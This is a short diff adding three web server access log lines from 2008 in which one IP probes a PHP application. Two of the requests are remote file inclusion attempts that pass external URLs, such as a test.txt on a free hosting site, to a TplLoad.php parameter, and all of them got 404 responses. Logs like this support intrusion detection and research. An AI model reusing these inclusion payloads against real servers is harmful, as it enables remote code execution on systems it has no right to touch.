@@ -1,0 +1,3 @@
+202.38.152.250 - - [17/Feb/2008:09:44:28 +0900] "GET //admin/classes/TplLoad.php?full_path_to_public_program=http://www.mecad.es/bo?? http" 404 1062 "-" "Mozilla/4.61 [en] (OS/2; U)"
+202.38.152.250 - - [17/Feb/2008:09:44:29 +0900] "GET //admin/classes/TplLoad.php?full_path_to_public_program=http://www.freewebtown.com/caliasa/test.txt??? http" 404 1062 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5"
+202.38.152.250 - - [17/Feb/2008:09:44:29 +0900] "GET //debian//asfd/./qwer/.//asdf http" 404 1062 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5"
